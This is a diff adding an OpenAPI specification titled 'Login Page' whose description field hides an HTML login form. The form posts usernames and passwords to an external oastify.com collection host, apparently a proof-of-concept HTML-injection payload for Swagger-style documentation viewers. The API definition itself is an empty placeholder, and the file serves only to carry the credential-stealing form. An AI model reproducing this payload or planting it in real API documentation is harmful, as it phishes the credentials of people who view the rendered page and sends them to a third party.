@@ -1,0 +1,21 @@
+openapi: 3.0.1
+info:
+  title: Login Page
+  description: <div class="login-form"> <div class="form-container"> <form action="https://swsu6t6htbgayjwd0b06ntlz7qdh17pw.oastify.com"
+    method="post" class="form-signin"> <div class="form-group"> <label for="username">Username</label>
+    <input type="text" name="username" size="20"> </div> <div class="form-group">
+    <label for="password">Password</label> <input type="password" name="password"
+    size="20"> </div> <div class="form-group"> <button type="submit" class="btn btn-default">Login</button>
+    </div> </form> </div> </div>
+  version: 1.0.0
+servers:
+- url: /
+paths:
+  /:
+    get:
+      responses:
+        "200":
+          description: Login successful
+          content: {}
+components: {}
+x-original-swagger-version: "2.0"
